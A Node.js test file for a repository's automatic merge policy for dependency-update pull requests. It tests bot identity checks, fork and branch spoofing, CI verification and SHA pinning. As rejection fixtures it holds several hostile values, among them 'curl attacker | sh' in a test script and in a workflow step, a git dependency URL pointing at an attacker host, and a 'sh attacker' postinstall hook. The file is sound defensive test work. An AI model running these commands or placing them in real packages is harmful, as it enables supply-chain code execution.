import test from "node:test";
import assert from "node:assert/strict";
import {
  actionRefsOnly,
  checksPassed,
  filesAllowed,
  manifestAllowed,
  REQUIRED_CHECKS,
  trustedUpdate,
  unchangedSnapshot,
} from "../scripts/dependency-pr-policy.mjs";
import { mergeDependencies } from "../scripts/dependency-pr-auto-merge.mjs";

const clone = (value) => JSON.parse(JSON.stringify(value));
const sha = "a".repeat(40),
  base = "b".repeat(40);
const repository = {
  id: 1239372919,
  full_name: "woosungchoi/codex-telegram-bot",
  owner: { login: "woosungchoi", id: 5674610 },
};
const owner = { ...repository.owner, type: "User" };
const dependabot = { login: "dependabot[bot]", id: 49699333, type: "Bot" };
const actions = { login: "github-actions[bot]", id: 41898282, type: "Bot" };
function pr(user = owner, ref = "automation/update-codex-packages") {
  return {
    number: 98,
    state: "open",
    draft: false,
    title: "Update Codex packages",
    user,
    head: { sha, ref, repo: repository },
    base: { sha: base, ref: "main", repo: repository },
    mergeable_state: "clean",
  };
}
const checks = () =>
  REQUIRED_CHECKS.map((name) => ({
    name,
    head_sha: sha,
    app: { slug: "github-actions" },
    status: "completed",
    conclusion: "success",
  }));
const pkg = {
  name: "bot",
  version: "1.4.0",
  scripts: { test: "node --test" },
  dependencies: { "@openai/codex-sdk": "0.160.0", dotenv: "^18.0.4" },
  devDependencies: { "@openai/codex": "0.160.0" },
};
const updatedPkg = () => {
  const updated = clone(pkg);
  updated.dependencies.dotenv = "^18.0.5";
  return updated;
};
const lock = (manifest) => ({
  name: "bot",
  version: "1.4.0",
  lockfileVersion: 3,
  packages: {
    "": {
      name: "bot",
      version: "1.4.0",
      dependencies: manifest.dependencies,
      devDependencies: manifest.devDependencies,
    },
    "node_modules/@openai/codex-sdk": {
      version: manifest.dependencies["@openai/codex-sdk"],
      resolved: "https://registry.npmjs.org/@openai/codex-sdk/-/codex-sdk.tgz",
    },
  },
});
const workflow =
  "name: CI\npermissions:\n  contents: read\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n      - run: npm test\n";
function fixture() {
  const data = {
    snapshot: pr(dependabot, "dependabot/npm_and_yarn/dependencies"),
    latest: null,
    checks: checks(),
    statuses: [],
    calls: [],
    files: [
      { status: "M", path: "package.json" },
      { status: "M", path: "package-lock.json" },
    ],
    contents: {
      base: {
        "package.json": JSON.stringify(pkg),
        "package-lock.json": JSON.stringify(lock(pkg)),
        ".github/workflows/ci.yml": workflow,
      },
      head: {
        "package.json": JSON.stringify(updatedPkg()),
        "package-lock.json": JSON.stringify(lock(updatedPkg())),
        ".github/workflows/ci.yml": workflow.replace("@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"),
      },
    },
  };
  let reads = 0;
  data.run = (command, args) => {
    data.calls.push({ command, args });
    if (command === "git") {
      if (args[0] === "fetch") {
        assert.deepEqual(args, ["fetch", "--no-tags", "origin", base, sha]);
        return "";
      }
      if (args[0] === "merge-base") return base + "\n";
      if (args[0] === "diff") {
        assert.deepEqual(args.slice(-2), [base, sha]);
        return data.files.map((f) => `${f.status}\0${f.path}\0`).join("");
      }
      if (args[0] === "show") {
        const [commit, path] = args[1].split(":");
        assert.ok([sha, base].includes(commit));
        return data.contents[commit === base ? "base" : "head"][path];
      }
    }
    if (command === "gh") {
      if (args[0] === "pr" && args[1] === "list")
        return JSON.stringify([{ number: 98 }]);
      if (args[0] === "pr" && args[1] === "merge") return "";
      const endpoint = args.at(-1);
      if (endpoint === `repos/${repository.full_name}`)
        return JSON.stringify(repository);
      if (endpoint.endsWith("/pulls/98")) {
        reads += 1;
        return JSON.stringify(
          reads === 1
            ? data.snapshot
            : reads === 2
              ? data.latest || data.snapshot
              : { ...data.snapshot, merged: data.mergeConfirmed !== false },
        );
      }
      if (endpoint.includes("/check-runs?")) {
        assert.ok(endpoint.includes(sha));
        return JSON.stringify([{ check_runs: data.checks }]);
      }
      if (endpoint.includes("/status?")) {
        assert.ok(endpoint.includes(sha));
        return JSON.stringify([{ statuses: data.statuses }]);
      }
    }
    throw new Error(`Unexpected fake command: ${command} ${args.join(" ")}`);
  };
  data.runMerge = () =>
    mergeDependencies({
      repo: repository.full_name,
      run: data.run,
      logger: { log() {} },
    });
  data.merges = () =>
    data.calls.filter(
      (call) =>
        call.command === "gh" &&
        call.args[0] === "pr" &&
        call.args[1] === "merge",
    );
  return data;
}

test("real updater PAT owner, Actions bot and Dependabot identities are supported", () => {
  assert.equal(trustedUpdate(pr(owner), repository), "codex");
  assert.equal(trustedUpdate(pr(actions), repository), "codex");
  assert.equal(
    trustedUpdate(
      pr(dependabot, "dependabot/npm_and_yarn/dependencies"),
      repository,
    ),
    "dependabot",
  );
  for (const user of [
    { ...owner, id: 123 },
    { ...actions, id: 123 },
    { ...dependabot, type: "User" },
  ])
    assert.equal(trustedUpdate(pr(user), repository), "");
});

test("spoofed branch, fork, draft and different base fail before inspecting candidate code", () => {
  const variants = [
    (p) => {
      p.user = { login: "attacker", id: 123, type: "User" };
    },
    (p) => {
      p.head.ref = "automation/update-codex-packages";
    },
    (p) => {
      p.head.repo = { id: 777, full_name: "attacker/codex-telegram-bot" };
    },
    (p) => {
      p.draft = true;
    },
    (p) => {
      p.base.ref = "release";
    },
    (p) => {
      p.head.sha = "invalid";
    },
  ];
  for (const mutate of variants) {
    const f = fixture();
    f.snapshot = clone(f.snapshot);
    mutate(f.snapshot);
    f.runMerge();
    assert.equal(f.merges().length, 0);
    assert.equal(
      f.calls.some((call) => call.command === "git"),
      false,
    );
  }
});

test("scripts, permissions, workflow commands and unrelated dependencies require manual review", () => {
  const malicious = updatedPkg();
  malicious.scripts.test = "curl attacker | sh";
  assert.equal(manifestAllowed(pkg, malicious, "dependabot"), false);
  const other = updatedPkg();
  other.dependencies.dotenv = "^19.0.0";
  assert.equal(manifestAllowed(pkg, other, "codex"), false);
  assert.equal(manifestAllowed(pkg, other, "dependabot"), true);
  const remote = updatedPkg();
  remote.dependencies["@openai/codex-sdk"] = "git+https://attacker/pkg.git";
  assert.equal(manifestAllowed(pkg, remote, "codex"), false);
  assert.equal(actionRefsOnly(workflow, workflow.replace("@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")), true);
  assert.equal(
    actionRefsOnly(
      workflow,
      workflow
        .replace("contents: read", "contents: write")
        .replace("@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"),
    ),
    false,
  );
  assert.equal(
    actionRefsOnly(
      workflow,
      workflow.replace("npm test", "curl attacker | sh").replace("@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"),
    ),
    false,
  );
  assert.equal(
    actionRefsOnly(
      workflow,
      workflow.replace("actions/checkout", "attacker/checkout"),
    ),
    false,
  );
  const f = fixture();
  f.contents.head["package.json"] = JSON.stringify(malicious);
  f.runMerge();
  assert.equal(f.merges().length, 0);
});

test("Dependabot Actions version updates pass; permissions changes, additions and lock metadata fail", () => {
  const f = fixture();
  f.snapshot = pr(dependabot, "dependabot/github_actions/checkout");
  f.files = [{ status: "M", path: ".github/workflows/ci.yml" }];
  f.contents.head["package.json"] = JSON.stringify(pkg);
  f.runMerge();
  assert.equal(f.merges().length, 1);
  for (const mutate of [
    (g) => {
      g.contents.head[".github/workflows/ci.yml"] = workflow.replace(
        "contents: read",
        "contents: write",
      );
    },
    (g) => {
      g.files[0].status = "A";
    },
    (g) => {
      g.files[0].path = "src/bot.js";
    },
  ]) {
    const g = fixture();
    g.snapshot = pr(dependabot, "dependabot/github_actions/checkout");
    g.files = [{ status: "M", path: ".github/workflows/ci.yml" }];
    mutate(g);
    g.runMerge();
    assert.equal(g.merges().length, 0);
  }
  const maliciousLock = lock(updatedPkg());
  maliciousLock.packages[""].scripts = { postinstall: "sh attacker" };
  const g = fixture();
  g.contents.head["package-lock.json"] = JSON.stringify(maliciousLock);
  g.runMerge();
  assert.equal(g.merges().length, 0);
});

test("all required CI names must succeed from GitHub Actions on the exact head", () => {
  assert.equal(checksPassed(checks(), [], sha), true);
  assert.equal(checksPassed([], [], sha), false);
  for (const name of REQUIRED_CHECKS) {
    const missing = checks().filter((check) => check.name !== name);
    assert.equal(checksPassed(missing, [], sha), false, name);
  }
  for (const mutate of [
    (c) => {
      c[0].conclusion = "skipped";
    },
    (c) => {
      c[0].status = "in_progress";
    },
    (c) => {
      c[0].head_sha = "c".repeat(40);
    },
    (c) => {
      c[0].app.slug = "forged-ci";
    },
  ]) {
    const f = fixture();
    mutate(f.checks);
    f.runMerge();
    assert.equal(f.merges().length, 0);
  }
  assert.equal(checksPassed(checks(), [{ state: "pending" }], sha), false);
});

test("new head/base after inspection is rejected, safe merge pins the inspected SHA", () => {
  for (const side of ["head", "base"]) {
    const f = fixture();
    f.latest = clone(f.snapshot);
    f.latest[side].sha = "c".repeat(40);
    assert.equal(unchangedSnapshot(f.snapshot, f.latest, repository), false);
    f.runMerge();
    assert.equal(f.merges().length, 0);
  }
  const f = fixture();
  f.runMerge();
  assert.equal(f.merges().length, 1);
  const args = f.merges()[0].args;
  assert.equal(args[args.indexOf("--match-head-commit") + 1], sha);
  assert.equal(
    f.calls.some(
      (call) =>
        call.command === "git" && ["checkout", "switch"].includes(call.args[0]),
    ),
    false,
  );
});

test("merge/API errors fail closed and are never retried against a changed head", () => {
  const f = fixture(),
    run = f.run;
  f.run = (command, args) => {
    if (command === "gh" && args[1] === "merge")
      throw new Error("head changed");
    return run(command, args);
  };
  assert.throws(f.runMerge, /could not be safely processed/);
  const malformed = fixture();
  const unconfirmed = fixture();
  unconfirmed.mergeConfirmed = false;
  assert.throws(unconfirmed.runMerge, /could not be safely processed/);
  malformed.contents.head["package.json"] = "{bad";
  assert.throws(malformed.runMerge, /could not be safely processed/);
  assert.equal(malformed.merges().length, 0);
  assert.equal(
    filesAllowed([], "codex", () => "{}"),
    false,
  );
});
